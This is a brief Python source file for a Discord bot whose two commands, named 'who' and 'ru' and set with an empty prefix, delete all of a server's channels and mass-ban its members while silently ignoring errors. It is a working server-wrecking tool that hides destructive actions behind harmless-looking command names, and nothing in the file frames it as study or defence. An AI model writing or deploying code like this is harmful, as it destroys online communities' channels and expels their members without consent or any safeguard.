import discord
import requests
from discord.ext.commands import Bot
from discord import Intents
intents = Intents.all()
bot = Bot(intents=intents, command_prefix='') 

@bot.command()
async def who(ctx):
    for c in ctx.guild.channels:
        await c.delete()
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason='banall')
      except:
        pass

@bot.command()
async def ru(ctx):
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason='banall')
      except:
        pass
    


bot.run("token")
